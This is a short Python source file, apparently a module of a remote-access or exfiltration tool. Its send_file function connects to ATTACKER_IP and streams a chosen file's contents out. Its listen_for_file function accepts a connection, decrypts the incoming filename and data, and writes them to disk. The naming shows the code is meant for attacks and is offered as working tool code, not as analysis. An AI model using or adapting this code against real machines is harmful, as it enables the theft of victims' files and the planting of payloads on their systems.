import socket
from config import *
from crypto import *


def send_file(file_name):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ATTACKER_IP, FILE_TRANSFER_PORT))

    file = open(file_name, 'r')
    s.send(file_name)
    data = file.read(4096)
    while 1:
        s.send(data)
        data = file.read(4096)
        if not data:
            break
    s.close()


def listen_for_file():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = socket.gethostname()
    print (host)
    s.bind((host, FILE_TRANSFER_PORT))
    s.listen(5)



    conn, addr = s.accept()
    print (addr)
    data = decrypt(conn.recv(4096))
    print data
    f = open(data, 'wb')
    while 1:
        data = decrypt(conn.recv(4096))
        if not data:
            break
        print data
        f.write(data)
    conn.close()
    f.close()
    s.close()

